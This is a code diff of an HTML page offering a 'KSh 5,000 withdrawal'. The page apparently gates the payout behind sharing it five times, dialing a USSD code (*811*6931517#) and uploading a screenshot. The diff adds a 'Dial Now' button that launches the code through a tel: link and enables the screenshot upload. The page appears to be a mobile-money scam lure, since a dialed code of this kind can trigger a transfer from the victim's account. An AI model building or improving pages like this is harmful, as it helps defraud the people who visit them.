@@ -45,7 +45,7 @@ Your withdrawal request for KSh 5,000 has been received.
 1. Dial *811*6931517#
 </h3>
 
-<button>
+<button onclick="dialNow()">
 📞 Dial Now
 </button>
 
@@ -69,18 +69,31 @@ Shares: 0/5
 </div>
 
 
-<div class="step disabled">
+<div class="step">
 
 <h3>
 3. Upload screenshot message
 </h3>
 
+<input type="file" accept="image/*">
+
+<button>
+📤 Upload Screenshot
+</button>
+
 </div>
 
 
 </div>
 
 </div>
+
+
+<script>
+function dialNow() {
+    window.location.href = "tel:*811*6931517#";
+}
+</script>
 
 </body>
 </html>
